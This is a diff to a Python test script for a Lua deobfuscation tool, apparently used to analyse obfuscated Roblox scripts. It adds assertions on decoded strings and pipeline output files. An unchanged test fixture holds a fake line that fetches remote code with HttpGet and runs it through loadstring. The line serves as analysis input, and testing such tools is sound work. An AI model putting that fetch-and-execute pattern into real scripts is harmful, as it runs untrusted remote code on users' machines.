@@ -22,6 +22,7 @@ print(K(1), Q[2], K(3))
 opened, meta = deobf.wrd_full_deobf(wrd)
 assert '"Hello"' in opened and '"World"' in opened and '"FireServer"' in opened, opened
 assert meta["replacements"] == 3 and meta["accessors_found"] == 1, meta
+assert any("Hello" in value for value in meta["decoded_strings"]), meta
 print("PASS wrd static table/accessor")
 
 # 3) drone XSUB yasasi (gercek blob — HAFIZA: drone_blob.txt 311,574 char, decoded 249,256 byte, drone_decoded.bin ile byte-identical)
@@ -47,6 +48,8 @@ else:
 fake = 'local LP_123456="..."; loadstring(game:HttpGet("https://x"))()'
 rep, outs = deobf.deobf_pipeline("mini.lua", fake.encode())
 assert "deobf.txt" in outs and "strings.txt" in outs
+wrd_report, wrd_outputs = deobf.deobf_pipeline("wrd.lua", wrd.encode())
+assert "wrd_strings.txt" in wrd_outputs and b"Hello" in wrd_outputs["wrd_strings.txt"]
 print("PASS pipeline")
 print()
 print("===", "ALL OK" if ok else "SOME FAIL", "===")
